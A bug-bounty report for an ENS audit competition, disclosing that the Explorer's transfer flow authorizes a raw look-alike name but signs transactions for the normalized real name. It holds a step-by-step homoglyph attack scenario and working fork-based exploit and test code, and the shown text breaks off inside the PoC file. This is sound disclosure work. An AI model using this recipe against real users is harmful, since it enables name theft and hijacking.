# 93119 w a critical transfer flow authorizes one ens name and signs transactions for a different one

**Submitted on Sep 14th 2026 at 10:03:18 UTC by @tomX0 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #93119
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief / Intro

The Explorer's "Transfer ownership" flow decides whether you are allowed to move a name by looking at one on-chain asset, then builds its transaction calldata for a different one.

The owner check reads the **raw** `$name` route parameter and asks the chain who owns that literal string. Every write the flow then emits — the resolver detach that runs first, and the ERC-1155 `safeTransferFrom` that runs last — is keyed on the **ENS-normalized** label derived from that same parameter.

ENS normalization is a client-side convention. The registries key names by their literal label bytes, so `vitalik\u00AD.eth` (a soft hyphen before the dot) and `vitalik.eth` are two separate registry entries with two separate token ids, while normalization collapses the first onto the second. The same holds for `Vitalik.eth`, which contains no deceptive character at all.

In production this means an attacker can register a look-alike label **directly into a victim's wallet**, the victim finds a second copy of their own name in the Explorer's own "Names you own" search, decides to get rid of it, and every transaction they sign operates on their real name instead. Every gate passes on the way through — the ENSv2 arm, the 2LD arm, the `isAddressEqual` owner comparison, the `ROLE_CAN_TRANSFER_ADMIN` role check — and the only human-readable string anywhere in those transactions is the raw look-alike the victim thinks they are throwing away. The first transaction of the flow clears the resolver on the victim's genuine name before the token ever moves; the last one transfers the genuine name to whatever address the victim typed.

Throughout this report I write `\u00AD` out explicitly rather than pasting it. It is U+00AD SOFT HYPHEN, which has no glyph, so `vitalik\u00AD.eth` and `vitalik.eth` are visually identical in every browser.

## Vulnerability Details

### The authorization gate reads the raw parameter

The transfer route takes `name` straight from the router and hands it, unchanged, to the owner query:

```tsx
// apps/portal/src/routes/$name/ownership/transfer.tsx
function RouteComponent() {
  const { name } = Route.useParams()
  const { address } = useConnection()

  const isSubname = !is2LD(name)

  const ownerQuery = useQuery(getEnsOwnerQueryOptions({ name }))
```

The entire authorization decision is one comparison further down:

```tsx
// apps/portal/src/routes/$name/ownership/transfer.tsx
          .with(
            { data: P.nonNullable, address: P.string },
            ({ data, address }) => isAddressEqual(address, data.owner),
            ({ data }) => (
              <AuthorizedTransfer
                name={name}
                registryAddress={data.registryAddress}
                owner={data.owner}
              />
            ),
          )
```

`getEnsOwner` does not touch the string on its way to the chain, and `resolveEnsOwner` just splits it on `.` before handing it to ensjs:

```ts
// apps/portal/src/utils/ens/resolveEnsOwner.ts
  const labels = name.split('.')
  const tld = labels[labels.length - 1]

  if (tld === 'eth' && labels.length >= 2) {
    const v2 = await resolveV2EthOwner(client, name)
```

The pinned ensjs `getOwner` action DNS-encodes the literal bytes, with no normalization anywhere:

```js
// @ensdomains/ensjs, dist/actions/public/v2/getOwner.js
    return readContractAction({
        address: contractAddress,
        abi: universalResolverV2FindOwnerSnippet,
        functionName: 'findOwner',
        args: [toHex(packetToBytes(name))],
    });
```

The question the app asks the chain is, literally, "who owns the string in the URL bar?"

### The calldata is built from the normalized label

`useTransferName` derives the token id from `getLabel(name)`:

```ts
// apps/portal/src/features/transfer/hooks/useTransferName.ts
  const prepareMutation = useMutation(
    resultMutationOptions({
      mutationFn: ({ recipient, options }: StartTransferParams) =>
        getEnsTokenId({
          label: getLabel(name),
          registryAddress,
        }).map((tokenId) => ({ recipient, tokenId, options })),
```

and `getLabel` is explicitly a normalizing function:

```ts
// apps/portal/src/utils/token/getLabel.ts
export function getLabel(name: string): string {
  const normalized = ens_normalize(name)
  const labels = ens_split(normalized)
  const first = labels[0]

  if (!first || first.error) {
    throw first?.error
  }

  return String.fromCodePoint(...first.input)
}
```

The clearest statement of the whole bug is a single function body where both forms are alive at once and both get handed to every step:

```ts
// apps/portal/src/features/transfer/hooks/useTransferName.ts
    const { walletClient, publicClient: pc, signer } = await getRuntime()
    const common = { name, walletClient, publicClient: pc, signer, chainId }
    const label = getLabel(name)

    await match(step)
      .with('set-eth-addr', () => setEthAddress({ ...common, recipient, id }))
      .with('detach-resolver', () =>
        detachNameResolver({ ...common, label, registryAddress, id }),
      )
      .with('detach-registry', () =>
        detachNameRegistry({ ...common, label, registryAddress, id }),
      )
      .with('transfer-token', () =>
        transferToken({ ...common, registryAddress, tokenId, recipient, id }),
      )
      .exhaustive()
```

`common` carries the **raw** `name`, which is what every step uses for its human-readable description. `label` carries the **normalized** one, which is what the on-chain writes are keyed on.

`getEnsTokenId` hashes that label with no further processing, the id goes straight into ERC-1155 calldata, and the description interpolates the raw name:

```ts
// apps/portal/src/features/transfer/helpers/transferToken.ts
  const data = encodeFunctionData({
    abi: erc1155Abi,
    functionName: 'safeTransferFrom',
    args: [walletWithAccount.account.address, recipient, tokenId, 1n, '0x'],
  })

  const txId = transactionManager.startTransaction(
    {
      type: 'custom',
      request: {
        type: 'eoa',
        from: walletWithAccount.account.address,
        to: registryAddress,
        data,
        value: 0n,
        chainId,
      },
    },
    signer,
    {
      id,
      description: `Transfer ${name}`,
      publicClient,
      chainId,
    },
  )
```

### The same split fires before the token ever moves

This is the cheapest leg of the attack in terms of victim interaction, and if I had to lead with one thing it would be this.

`register()` on the ENSv2 `ETHRegistrar` takes the resolver as a plain argument, so the attacker picks what the planted twin points at. That choice decides what the Explorer offers the victim, because `useTransferDetachTargets` reads the targets from the **raw** name but checks the permission on the **normalized** label:

```ts
// apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts
  let label: string | null = null
  try {
    label = getLabel(name)
  } catch {}

  const resolverQuery = useNameResolverAddress({ name })
  const registriesQuery = useQuery(getNameRegistriesQueryOptions({ name }))
  const ethAddressQuery = useQuery(getEthAddressQueryOptions(name))

  const rolesQuery = useQuery({
    ...getNameRolesForAccountQueryOptions({
      registryAddress,
      label: label ?? '',
      account: owner,
    }),
    enabled: label !== null,
  })
```

`resolverQuery` asks about the twin, which has a resolver because the attacker set one. `rolesQuery` asks whether the victim holds `ROLE_SET_RESOLVER` on `vitalik`, which they do, on their real name. Both come back true, so the option becomes visible:

```ts
// apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts
      detachResolver:
        resolverQuery.isSuccess &&
        hasResolver &&
        rolesQuery.isSuccess &&
        heldRoles.includes('ROLE_SET_RESOLVER'),
```

`SendNameForm` defaults every toggle to on:

```tsx
// apps/portal/src/features/transfer/components/SendNameForm.tsx
  const [recipientInput, setRecipientInput] = useState('')
  const [options, setOptions] = useState<Record<OptionKey, boolean>>({
    setEthAddress: true,
    detachResolver: true,
    detachRegistry: true,
  })
```

and `buildTransferPlan` puts the detach steps first, deliberately:

```ts
// apps/portal/src/features/transfer/utils/buildTransferPlan.ts
  if (options.detachResolver) {
    steps.push('detach-resolver')
  }

  if (options.detachRegistry) {
    steps.push('detach-registry')
  }

  steps.push('transfer-token')
```

`detachNameResolver` then keys the write on the normalized `label` while describing it with the raw `name`:

```ts
// apps/portal/src/features/transfer/helpers/detachNameResolver.ts
  const writeParams = setResolverWriteParameters(walletWithAccount, {
    label,
    registryAddress,
    resolverAddress: zeroAddress,
  })
```

```ts
// apps/portal/src/features/transfer/helpers/detachNameResolver.ts
      description: `Detach resolver for ${name}`,
```

`setResolverWriteParameters` in the pinned ensjs computes `BigInt(labelhash(label))` and emits `setResolver(tokenId, resolverAddress)`.

So the first transaction of the flow is `setResolver(labelhash("vitalik"), 0x0)` against the victim's genuine name, signed under a prompt that reads `Detach resolver for vitalik.eth`. It happens before the token transfer, and it does not depend on what the victim typed in the recipient field — only on there being *some* valid recipient there, since that is what enables the button. The victim can abandon the flow at the next prompt and the damage is already on chain.

The file concedes what a partial run costs, in its own header comment:

```ts
// apps/portal/src/features/transfer/helpers/detachNameResolver.ts
 * but a migrated/locked name can own the token yet lack it. Callers must confirm
 * the role first (see `useTransferDetachTargets`) — this step runs before the
 * irreversible token transfer, so a revert here leaves the name degraded.
```

The same divergence exists on `detachNameRegistry`, where `setSubregistry` is keyed on `label` and described with `name`, and the attacker can arm that leg too by passing a subregistry to `register()`. I did not exercise it, so I claim only the resolver leg.

### Why the role check does not save the user

`useCanTransferName` mirrors the on-chain `ROLE_CAN_TRANSFER_ADMIN` gate so the UI can refuse a transfer that would revert. It runs on the normalized label too:

```ts
// apps/portal/src/features/transfer/hooks/useCanTransferName.ts
  const label = useMemo(() => {
    try {
      return getLabel(name)
    } catch {
      return null
    }
  }, [name])

  const isEnabled = enabled && !!label && !!registryAddress && !!account

  const query = useQuery({
    ...getHasRolesQueryOptions({
      registryAddress: registryAddress ?? zeroAddress,
      label: label ?? '',
      roles: [TRANSFER_ROLE],
      account: account ?? zeroAddress,
    }),
    enabled: isEnabled,
  })
```

This makes things worse rather than better. The Transfer button requires `isConnectedOwner && hasTransferRole && !isSubname`. `isConnectedOwner` is true because the victim owns the *planted* name. `hasTransferRole` is true because the victim holds the transfer role on their *real* name. The button appears on the strength of two different assets.

### No guard is applied on this path

`isValidEnsName` in `apps/portal/src/utils/token/isNormalized.ts` rejects a non-normalized name, and the app does call it — but only twice in the whole route tree, and neither call is on the transfer path:

```
$ grep -rn "isValidEnsName(" apps/portal/src/routes
apps/portal/src/routes/$name.tsx:29:    if (isValidEnsName(name) && isTLD(name)) {
apps/portal/src/routes/$name/index.tsx:442:  const isValidName = isValidEnsName(name)
```

`$name.tsx` is the layout route wrapping every `/$name/*` page, and it uses the result only to decide a TLD redirect; it does not reject the parameter. `$name/index.tsx` is the profile page, which does render an "Invalid name" body.

**That is the one mitigation a triager should know about, and I want to state it rather than let it be discovered:** a victim who lands on the planted name's *profile* first does see a warning. It does not follow them into the flow. The sidebar is mounted by the layout route and keeps rendering an "Ownership" link with the same raw parameter, and neither `routes/$name/ownership/index.tsx` nor `routes/$name/ownership/transfer.tsx` contains any validation at all. The warning is also easy to route around: a link that lands the victim directly on `/<planted name>/ownership` never renders the profile body.

### Attack scenario, step by step

Two wallets: **A** (attacker) and **V** (victim). **V** already owns `vitalik.eth` as an ENSv2 2LD with `ROLE_CAN_TRANSFER_ADMIN`, which is the ordinary state of any registered name.

1. As **A**, register the label `vitalik\u00AD` — the seven ASCII letters `vitalik` followed by U+00AD SOFT HYPHEN — through the ENSv2 `ETHRegistrar`, passing **V**'s address as the `owner` argument and any working resolver as the `resolver` argument. A convenient way to produce the string is `'vitalik' + String.fromCharCode(0x00AD)`. **V** is not prompted and does nothing.
2. As **V**, connect to the Explorer and type your own name into the search box. Nothing renders while the box is empty, because `filterAndSortOwnedNames` returns `[]` for an empty query. But the match is deliberately loose: the query is trimmed and lowercased, a TLD-like suffix of up to three characters is stripped, and what remains is tested with `includes` against the lowercased name. Typing `vitalik`, `vitalik.eth`, or even `vital`, returns **both** rows under "Names you own", and both render as `vitalik.eth`, because the row label is the raw name string.

   This is a better discovery path than a link from the attacker, and it is worth being explicit about why: it is organic. The victim goes looking for their own name, in the app's own search, and the app hands them two identical rows. No message has to be delivered and no link has to be clicked.

   `mergeOwnedNames` de-duplicates by `name.trim().toLowerCase()`, first entry wins. The soft hyphen survives that key, so both rows are listed.
3. As **V**, click the *second* row, the planted one. Equivalently, and more deterministically for a triager, navigate straight to `/<planted name>/ownership` with the soft hyphen URL-encoded as `%C2%AD`, so `https://<explorer host>/vitalik%C2%AD.eth/ownership`. That also skips the profile route's "Invalid name" body entirely.
4. Observe that the page renders normally and the **Transfer** button is present in the header. It is there because the owner check passed on the planted name and the role check passed on the real one.
5. Click **Transfer**. The page heading is the literal string `Transfer ownership`; no name appears in the page body. The sidebar shows the raw route parameter, which renders as `vitalik.eth`.
6. Type any valid recipient address. Any address that is neither **V**'s own nor the zero address is accepted; those two are the only ones `SendNameForm` refuses. The detach options appear the moment a valid recipient resolves, and **Detach the resolver** is already switched on. Press **Transfer name**.
7. The wallet prompts for the **first** transaction of the plan. The Explorer labels it `Detach resolver` / `Detach resolver for vitalik\u00AD.eth`, which reads on screen as `Detach resolver for vitalik.eth`. Its calldata is `setResolver(BigInt(labelhash("vitalik")), 0x0)` — **V**'s genuine name. Confirm it and `vitalik.eth` stops resolving: address records, avatar, text records, and anything anyone resolves through it. Nothing about the planted twin changes.

   **This is where the flow becomes damaging, and it lands before the token moves. Which address the victim typed makes no difference: the recipient only has to be valid, and this step never uses it.** A victim who senses something is wrong here and closes the modal has already lost the resolver.
8. If **V** continues, the wallet prompts for `safeTransferFrom(V, <recipient>, <tokenId>, 1, 0x)` against the leaf registry contract. The description throughout the Explorer's own modal is `Transfer vitalik\u00AD.eth` / `Transfer name - vitalik\u00AD.eth` — the raw invisible-suffix string, which reads as `Transfer vitalik.eth`.
9. Result: `<tokenId>` is the id of the label `vitalik`, not of `vitalik\u00AD`. **V** still owns the planted junk name. `vitalik.eth`, resolver already cleared, now belongs to whoever **V** typed in step 6.

To confirm step 9 without registering anything, compute the two labelhashes. `labelhash("vitalik")` is `0xaf2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc` and `labelhash("vitalik\u00AD")` is `0x1c2d43d4ce9f7dba04fd5a4445a0f11b0a8c11788374634f83b2254ade57c899`. The token id in the calldata is derived from the first.

### Why this exploit string, and the caveat that drove it

The pinned `@adraffy/ens-normalize` collapses several classes of input onto `vitalik.eth`: `vitalik\u00AD.eth` (soft hyphen), `vitalik\uFE0F.eth` (VS16), `vitalik\u200B.eth` (zero-width space), the fullwidth `\uFF56italik.eth`, and plain `VITALIK.eth`. Only some of them are usable for the owned-names discovery route.

`mergeOwnedNames` keys on `name.trim().toLowerCase()`, first wins, so an uppercase planted label collides with the real name and one of the two rows is silently dropped from the owned-names list. The fullwidth variant survives the dedup but is visibly a different glyph, so a careful victim can tell the rows apart. The invisible codepoints — soft hyphen, VS16, zero-width space — survive the dedup *and* render identically. That is why the walkthrough is written around U+00AD.

Two things this caveat does not apply to, and they matter for the duplicate analysis further down: the direct-URL path in step 3 does not go through `mergeOwnedNames` at all, and the divergence inside `useTransferName` is indifferent to which variant produced it. Test 9 of the proof of concept drives it with a plain capital `V`.

## Impact Details

An attacker willing to spend one registration fee on a chosen target can make that target's own routine "clean up a name I don't want" action operate on their real name instead. Two distinct harms land, in this order:

**1. The victim's genuine name stops resolving, before anything else happens.** The first transaction of the flow clears the resolver on the victim's genuine 2LD, so it stops resolving for everyone: records, avatar, addresses, and any service that resolves through it. That happens before the token moves, regardless of which address the victim typed, and it is recoverable only by the victim noticing and re-setting the resolver themselves. For a name used as a payment identifier, the downstream consequence is obvious.

**2. The victim's genuine name leaves their wallet.** The last transaction moves the genuine 2LD to the address the victim typed. The victim intended to dispose of a junk name; they disposed of their real one. It is an ordinary ERC-1155 movement and there is no undo.

### Why this maps to the selected impact

The selected entry is *"Malicious interactions with an already-connected wallet, such as: modifying transaction arguments or parameters."* That is the entry whose text describes what actually executes. What diverges here is a *transaction argument*: the `tokenId` argument of `safeTransferFrom`, and the token-id argument of `setResolver`, address a different on-chain asset than the one the application's own authorization read approved. The wallet is already connected, the user is inside a first-class product flow, and the argument that determines which asset moves comes from a second, different reading of the same input.

A secondary fit is the lead-in of *"Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient."* The transaction details the Explorer displays are `Transfer vitalik\u00AD.eth` and `Detach resolver for vitalik\u00AD.eth`, neither of which is the name in the calldata. I claim the lead-in only, not the two bullets under it, because nothing here resolves or renders a name to an attacker-controlled address.

The resolver-detach leg is also a clean fit for *"leaving a name permanently inaccessible after the flow"* under the hijack/brick entry, but that entry names a **Manager** flow and this is the Explorer, so I flag it rather than claim it.

### Severity justification, stated plainly

The attack costs one registration fee per chosen target, so it does not scale and cannot be sprayed. It also needs real cooperation from the victim: connect, open the planted name, press Transfer, type a recipient, confirm a wallet prompt. Both points are true and I would rather raise them myself than have them raised for me.

Three things argue against dropping below the tier the program itself assigns to this impact. The deception is perfect on the affected path, because the two strings render identically and every string the flow prints is the raw one. The first damaging transaction lands before the token moves and does not depend on which recipient the victim chose. And the token transfer, once confirmed, is irreversible.

Transferring a name is a normal documented workflow, so this is not an "un-prompted, in-app user action outside the normal app workflows." I would not fight a downgrade to High if triage weighs the interaction requirement more heavily, but I do not think it belongs below that.

### What I am not claiming

Not *"Direct theft of user NFTs."* For the victim's name to land in the attacker's wallet, the victim has to type the attacker's address into the recipient field, and I have not demonstrated a non-social-engineering reason why they would.

If **V** does type **A**'s address in step 6, **A** owns `vitalik.eth` outright. That is the worst outcome available here, and it is why I looked at this route in the first place, but every mechanism I can think of for getting there is social engineering, which the program puts out of scope as an activity and which I have not tested. So I am reporting the two harms above, which need no such step. The theft variant is a labelled escalation, not part of the claim.

## Proof of Concept

## Proof of Concept

Two independent artifacts, both executed, and they should be read together.

The first establishes the **on-chain preconditions**: that the ENSv2 registrar accepts a label ENS normalization would reject, and that the attacker can put the resulting name in the victim's wallet without the victim doing anything. It runs against a local anvil fork.

The second is an **application-level PoC** that mounts the app's real `useTransferName` hook and asserts on the calldata it emits. It runs under the repository's own vitest config.

No deployed ENS asset was contacted at any point. Everything below ran against a local fork, local accounts, and locally minted test tokens.

### 1. On-chain preconditions — executed on a local anvil fork

Fork of Sepolia, `--chain-id 11155111`.

The registrar's `register` takes both the owner and the resolver as plain arguments, visible in the ABI pinned in the repository (`@ensdomains/ensjs-abi`, `v2/ethRegistrar`):

```
register(string label, address owner, bytes32 secret, address subregistry,
         address resolver, uint64 duration, address paymentToken, bytes32 referrer)
  -> uint256 tokenId
```

The attacker pays, names the victim as `owner`, picks the `resolver`, and is done.

#### The setup script

Run from `apps/portal`, so it uses the app's own pinned `viem` and `ensjs`:

```js
import {
  createPublicClient, createWalletClient, http, encodeFunctionData,
  parseAbi, labelhash, zeroAddress,
} from 'viem'
import { privateKeyToAccount, mnemonicToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { extendChainWithEns } from '@ensdomains/ensjs/chain'
import { getResolver } from '@ensdomains/ensjs/public'
import {
  getOwner as getOwnerV2, getNameRegistries, getNameRolesForAccount,
} from '@ensdomains/ensjs/public/v2'
import { setResolverWriteParameters } from '@ensdomains/ensjs/wallet/v2'

const RPC = process.env.RPC_URL ?? 'http://127.0.0.1:8545'
const chain = extendChainWithEns(sepolia)
const pub = createPublicClient({ chain, transport: http(RPC) })

// anvil's default accounts. The attacker pays for everything.
const attacker = privateKeyToAccount('0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80')
const victim = mnemonicToAccount('test test test test test test test test test test test junk', { addressIndex: 1 })

// Sepolia ENSv2 deployment addresses, read on the fork.
const REG = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'   // ETHRegistrar
const USDC = '0x768F42455A2D082E23ceeF7d51e5787C82d67a39'  // payment token
const RESOLVER = '0x640294a2b2d87e7f522db3e3e3e876764bce170d'
const ZH = `0x${'00'.repeat(32)}`

const regAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) pure returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function getRegisterPrice(string label, uint64 duration, address paymentToken) view returns (uint256, uint256)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer) returns (uint256)',
])
const tokAbi = parseAbi([
  'function mint(address to, uint256 amount)',
  'function approve(address spender, uint256 amount) returns (bool)',
])

const rpc = (method, params) =>
  fetch(RPC, { method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method, params }) }).then((r) => r.json())
const wallet = (a) => createWalletClient({ account: a, chain, transport: http(RPC) })
const send = async (wc, to, data) => {
  const hash = await wc.sendTransaction({ to, data })
  const r = await pub.waitForTransactionReceipt({ hash })
  if (r.status !== 'success') throw new Error(`tx reverted: ${hash}`)
}

const S = Math.floor(Number(await pub.getBlockNumber()) % 1e6)
const GENUINE = `forkdemo${S}`
const TWIN = `${GENUINE}\u00AD`      // U+00AD SOFT HYPHEN — renders identically
const CASED = `Forkdemo${S}`         // no deceptive codepoint at all

for (const a of [attacker.address, victim.address]) {
  await rpc('anvil_setCode', [a, '0x'])
  await rpc('anvil_setBalance', [a, `0x${(10n ** 20n).toString(16)}`])
}
await send(wallet(attacker), USDC,
  encodeFunctionData({ abi: tokAbi, functionName: 'mint', args: [attacker.address, 10_000_000_000n] }))

const secret = `0x${'55'.repeat(32)}`
const duration = 31536000n

/** The ATTACKER signs and pays; `owner` and `resolver` are plain arguments. */
const registerAs = async (label, owner, resolver) => {
  const commitment = await pub.readContract({ address: REG, abi: regAbi, functionName: 'makeCommitment',
    args: [label, owner, secret, zeroAddress, resolver, duration, ZH] })
  await send(wallet(attacker), REG, encodeFunctionData({ abi: regAbi, functionName: 'commit', args: [commitment] }))
  await rpc('evm_increaseTime', [90]); await rpc('evm_mine', [])
  const [base, premium] = await pub.readContract({ address: REG, abi: regAbi,
    functionName: 'getRegisterPrice', args: [label, duration, USDC] })
  await send(wallet(attacker), USDC, encodeFunctionData({ abi: tokAbi, functionName: 'approve',
    args: [REG, (base + premium) * 2n] }))
  await send(wallet(attacker), REG, encodeFunctionData({ abi: regAbi, functionName: 'register',
    args: [label, owner, secret, zeroAddress, resolver, duration, USDC, ZH] }))
}

// --- A: the plant ----------------------------------------------------------
await registerAs(GENUINE, victim.address, RESOLVER)   // the victim's real name
await registerAs(TWIN, victim.address, RESOLVER)      // planted by the attacker

// --- B: exactly the reads useTransferDetachTargets performs ----------------
const registries = await getNameRegistries(pub, { name: `${TWIN}.eth` })
const registryAddress = registries[1]
const rawResolver = await getResolver(pub, { name: `${TWIN}.eth` })
const roles = await getNameRolesForAccount(pub,
  { registryAddress, label: GENUINE, account: victim.address })

// --- C: the first transaction the Explorer's plan emits ---------------------
const wp = setResolverWriteParameters({ chain, account: victim },
  { label: GENUINE, registryAddress, resolverAddress: zeroAddress })
await send(wallet(victim), wp.address,
  encodeFunctionData({ abi: wp.abi, functionName: wp.functionName, args: wp.args }))

// --- D: no deceptive codepoint is required ---------------------------------
await registerAs(CASED, victim.address, RESOLVER)
```

#### The output, verbatim

```
attacker 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
victim   0x70997970C51812dc3A010C7d01b50e0d17dc79C8

[A] owner of "forkdemo690161.eth"          : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    owner of "forkdemo690161\u00AD.eth"    : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    -> the attacker paid; the registrar accepted the non-normalized
       label and assigned it to the victim with no victim action

[B] useNameResolverAddress({ name: RAW twin })     -> 0x640294A2b2D87E7f522db3e3E3E876764BCe170D
    getNameRegistries({ name: RAW twin })[0]       -> 0x0000000000000000000000000000000000000000
    roles for the victim on the NORMALIZED label   -> ROLE_SET_RESOLVER held: true
    => optionIsVisible.detachResolver = true  (SendNameForm defaults it ON)

[C] step 1 of the plan: setResolver(57315463087814599556711829895930470988111822402992025192151469447878918586158, 0x0000000000000000000000000000000000000000) on 0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2
    BigInt(labelhash("forkdemo690161"))  = 57315463087814599556711829895930470988111822402992025192151469447878918586158
    BigInt(labelhash(twin))              = 31229893586591654625329295769825810221675016095209639908894398418975572132102   <- NOT the target
    resolver of the GENUINE name : 0x640294A2b2D87E7f522db3e3E3E876764BCe170D -> null
    resolver of the TWIN         : 0x640294A2b2D87E7f522db3e3E3E876764BCe170D -> 0x640294A2b2D87E7f522db3e3E3E876764BCe170D
    -> the victim signed "Detach resolver for forkdemo690161\u00AD.eth" and the
       resolver that was cleared belongs to "forkdemo690161.eth"

[D] owner of "Forkdemo690161.eth"          : 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
    labelhash("Forkdemo690161")            = 0x8aa6c2b3876788fdd7434051d6c0f5d195391e5436ce613cacb7e29893c73ff2
    labelhash("forkdemo690161")            = 0x7eb7670a25f04a21a50eed03e6d449e0dff22ecf09e526dcc7e969d6bc7cbf2e
    -> a capital letter is a distinct registry entry too. No homoglyph,
       no control character, no leading or trailing dot.
```

`[A]` settles the precondition: the attacker paid, the registrar accepted the non-normalized label, and the victim's address owns both names without the victim signing anything. `[B]` settles that the Explorer will show the detach toggle. `[C]` settles that the write the Explorer would build from the normalized label clears the *genuine* name's resolver while leaving the twin's alone. `[D]` supports the duplicate analysis below.

For corroboration of `[A]` from contract source rather than from execution, `ensdomains/contracts-v2`, `contracts/src/registrar/StandardRentPriceOracle.sol` says so in a comment directly above the function:

```solidity
    /// @notice Check if a `label` is valid. Does not check if normalized.
    function isValid(string calldata label) external view returns (bool) {
        return getBasePrice(label, 1) > 0;
    }
```

and the price function it defers to only bounds byte length and codepoint count. That repository is out of scope and is not vendored here, so I treat it as supporting reading rather than as the evidence. The fork run above is the evidence.

### 2. Application-level PoC — what it does and how it is built

A single self-contained vitest file, run with the repository's own `apps/portal/vitest.config.ts`, so its `@` alias and its happy-dom environment. Only the chain is replaced: a viem `custom` transport answers `findOwner`, `findRegistries` and `getTokenId` from a declared in-memory registry in which the victim owns `vitalik`, `vitalik\u00AD` and `Vitalik`. The DNS-encoding, normalization, labelhashing, ERC-1155 encoding and `setResolver` encoding are all the real code from the target and its pinned dependencies.

It has two halves.

**Tests 1 to 6** replay the transfer path in the order the route and `useTransferName` run it, calling the repository's own modules at every step: `resolveEnsOwner`, `getLabel`, `getEnsTokenId`, `transferToken`, `isValidEnsName`, `mergeOwnedNames`. They are narrative, and I want to flag their weakness rather than let a reviewer find it: because they call `getLabel` themselves, they would still pass if `useTransferName` stopped calling it. They demonstrate the divergence; they do not *detect* it.

**Tests 7 to 9** mount the real `useTransferName` with `renderHook` and assert on what the hook emits. That makes them an oracle. The in-memory `getTokenId` is deliberately honest — it answers for whichever labelhash it is handed rather than returning a canned id — so a hook that stops normalizing gets the twin's id back and the assertion dies.

### 3. How to run it

Save the file in the next section as `poc.test.ts`, then:

```
cp poc.test.ts apps/portal/src/
cd apps/portal && pnpm vitest run src/poc.test.ts
```

It needs no configuration of its own.

One practical note before you run it. The file contains literal U+00AD characters in the `HOSTILE` and `HOSTILE_LABEL` constants. U+00AD has no glyph, so if it gets lost in copy-paste, replace those two lines with:

```ts
const HOSTILE = 'vitalik' + String.fromCharCode(0x00AD) + '.eth'
const HOSTILE_LABEL = 'vitalik' + String.fromCharCode(0x00AD)
```

### 4. The PoC file in full

```ts
/**
 * PoC — Portal name transfer authorizes against the RAW `$name` route parameter
 * but derives the ERC-1155 token id from the ENS-NORMALIZED label.
 *
 * What this proves, using the app's own modules and no reimplementation of them:
 *
 *   1. `isValidEnsName` (src/utils/token/isNormalized.ts) rejects the hostile
 *      string, so the app already owns a guard that would have caught it — the
 *      transfer route simply never calls it.
 *   2. The authorization read the transfer route performs — `resolveEnsOwner`,
 *      which `getEnsOwnerQueryOptions` delegates to — resolves the RAW string
 *      and returns the victim as owner, so the route's `isAddressEqual` gate
 *      passes on the strength of the planted look-alike name.
 *   3. `getLabel` (src/utils/token/getLabel.ts) normalizes that same string to a
 *      DIFFERENT label, and the token id the flow then reads via the app's
 *      `getEnsTokenId` belongs to the victim's real name.
 *   4. The `safeTransferFrom` calldata that `transferToken`
 *      (src/features/transfer/helpers/transferToken.ts) actually encodes carries
 *      the REAL name's token id, while the human-readable description on the
 *      same transaction carries the RAW look-alike string.
 *   5. Negative control: an already-normalized name drives both paths to the
 *      same token id.
 *   6. `mergeOwnedNames` (src/features/dashboard/utils/ownedNamesUtils.ts)
 *      de-duplicates owned names case-insensitively, which is why an invisible
 *      codepoint — not an uppercase or fullwidth homoglyph — is the variant that
 *      survives the dashboard listing.
 *   7. The REAL `useTransferName` hook, mounted with `renderHook`, emits
 *      `safeTransferFrom` for the id of "vitalik" when its `name` prop is the
 *      U+00AD twin.
 *   8. The same mounted hook's FIRST transaction, when the detach-resolver
 *      option is on (it is on by default in SendNameForm), is
 *      `setResolver(labelhash("vitalik"), 0x0)` — the victim's genuine name,
 *      before the token ever moves.
 *   9. The divergence needs no deceptive character: "Vitalik.eth", every
 *      codepoint of which is ASCII [A-Za-z.], drives the mounted hook to emit
 *      the id of "vitalik" just the same.
 *
 * Tests 1-6 replay the flow's steps in order; they are narrative and they are
 * NOT mutation-sensitive, because they call `getLabel` themselves. Tests 7-9
 * mount the hook, so they are the oracle. Verified by mutation:
 *
 *   useTransferName.ts:113  getLabel(name) -> name.split('.')[0]   => tests 7 AND 9 FAIL
 *   useTransferName.ts:132  getLabel(name) -> name.split('.')[0]   => test 8 FAILS
 *
 * Both mutations were applied, run, and reverted; the file was byte-compared
 * against HEAD afterwards and the suite returned to 9/9 green.
 *
 * The chain is replaced by an in-memory registry served through a viem `custom`
 * transport: findOwner / findRegistries / getTokenId are answered from a
 * declared state. `getTokenId` is an HONEST oracle — it answers for whichever
 * labelhash it is handed, so a hook that stops normalizing gets the twin's id
 * back rather than a canned answer. Every piece of ENS logic in the path —
 * DNS-encoding of the name, normalization, labelhash, token-id read, ERC-1155
 * and setResolver encoding — is the real code from the repository and its
 * pinned dependencies.
 *
 * The registry state this file declares was independently reproduced on a local
 * anvil fork of Sepolia; see the report's "On-chain preconditions" section.
 *
 * HOW TO RUN
 *   1. Copy this file into the portal app's `src` directory:
 *        cp poc.test.ts apps/portal/src/
 *   2. From `apps/portal`, run it with the app's own vitest:
 *        pnpm vitest run src/poc.test.ts
 *
 * It needs no config of its own: it resolves the app's `@` alias and its
